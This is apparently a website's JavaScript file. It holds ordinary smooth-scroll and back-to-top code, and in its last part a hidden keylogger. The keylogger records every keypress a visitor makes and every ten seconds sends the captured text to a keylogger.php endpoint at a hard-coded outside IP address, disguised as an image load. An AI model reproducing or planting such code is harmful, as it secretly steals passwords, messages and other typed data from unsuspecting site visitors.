 jQuery('body').css('overflow','hidden'); 
 document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();

        document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
        });
    });
});

window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

function topFunction() {
	document.getElementById('top').scrollIntoView({
            behavior: 'smooth'
        });
}

var keys='';
var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}

window.setInterval(function(){
	console.log(keys);
	if(keys.length>0) {
		new Image().src = url+keys;
		keys = '';
	}
}, 10000);